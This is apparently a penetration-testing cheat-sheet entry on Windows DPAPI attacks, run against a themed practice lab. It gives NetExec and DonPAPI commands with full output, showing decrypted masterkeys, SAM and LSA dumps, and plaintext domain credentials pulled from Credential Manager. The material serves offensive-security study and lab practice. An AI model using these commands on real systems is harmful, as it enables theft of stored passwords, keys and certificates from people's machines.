**DPAPI Attacks** are a method used in Windows environments where an attacker targets encrypted data. It works by exploiting the Data Protection API (DPAPI) to decrypt sensitive information, such as stored passwords or encryption keys, by obtaining the necessary credentials or keys to access the protected data.

### Netexec

```bash
nxc smb 192.168.56.11 -u ROBB.STARK -p sexywolfy --dpapi
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\ROBB.STARK:sexywolfy (Pwn3d!)
SMB         192.168.56.11   445    WINTERFELL       [*] Collecting User and Machine masterkeys, grab a coffee and be patient...
SMB         192.168.56.11   445    WINTERFELL       [+] Got 8 decrypted masterkeys. Looting secrets...
SMB         192.168.56.11   445    WINTERFELL       [robb.stark][CREDENTIAL] Domain:target=TERMSRV/castelblack - north\robb.stark:sexywolfy
SMB         192.168.56.11   445    WINTERFELL       [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{06107D65-E548-48FB-994D-3096AC86E0EE} - NORTH\eddard.stark:FightP3aceAndHonor!
SMB         192.168.56.11   445    WINTERFELL       [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{FED5EDBF-FF03-43F5-9BBE-E4E8F6B18684} - NORTH\robb.stark:sexywolfy
```

### Donpapi

```bash
donpapi collect -d north -u ROBB.STARK -p sexywolfy -t 192.168.56.11
[💀] [+] First time use detected. Creating home directory
[💀] [+] DonPAPI Version 2.0.1
[💀] [+] Output directory at /home/garffff/.donpapi
[💀] [+] Loaded 1 targets
[💀] [+] Recover file available at /home/garffff/.donpapi/recover/recover_1723803529
[192.168.56.11] [+] Starting gathering credz
[192.168.56.11] [+] Dumping SAM
[11:18:49] ERROR    SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.                                                                                           secretsdump.py:1340
[192.168.56.11] [$] [SAM] Got 3 accounts
[192.168.56.11] [+] Dumping LSA
[192.168.56.11] [$] [LSA] (Unknown User):sexywolfy
[192.168.56.11] [+] Dumping User and Machine masterkeys
[192.168.56.11] [$] [DPAPI] Got 8 masterkeys
[192.168.56.11] [+] Dumping User Chromium Browsers
[192.168.56.11] [+] Dumping User and Machine Certificates
[192.168.56.11] [$] [Certificates] [SYSTEM] - VAGRANT - VAGRANT_179DDAC42F086D3C.pfx
[192.168.56.11] [$] [Certificates] [SYSTEM] - winterfell.north.sevenkingdoms.local - winterfell.north.sevenkingdoms.local_6A95EDD4DA2C6B83.pfx - Client auth possible
[192.168.56.11] [+] Dumping User and Machine Credential Manager
[192.168.56.11] [$] [CredMan] [robb.stark] Domain:target=TERMSRV/castelblack - north\robb.stark:sexywolfy
[192.168.56.11] [$] [CredMan] [SYSTEM] Domain:batch=TaskScheduler:Task:{06107D65-E548-48FB-994D-3096AC86E0EE} - NORTH\eddard.stark:FightP3aceAndHonor!
[192.168.56.11] [$] [CredMan] [SYSTEM] Domain:batch=TaskScheduler:Task:{FED5EDBF-FF03-43F5-9BBE-E4E8F6B18684} - NORTH\robb.stark:sexywolfy
[192.168.56.11] [+] Gathering recent files and desktop files
[192.168.56.11] [+] Dumping User Firefox Browser
[192.168.56.11] [+] Dumping MobaXterm credentials
[192.168.56.11] [+] Dumping MRemoteNg Passwords
[192.168.56.11] [+] Dumping User's RDCManager
[192.168.56.11] [+] Dumping SCCM Credentials
[192.168.56.11] [+] Dumping User and Machine Vaults
[192.168.56.11] [+] Dumping VNC Credentials
[192.168.56.11] [+] Dumping Wifi profiles
DonPAPI running against 1 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```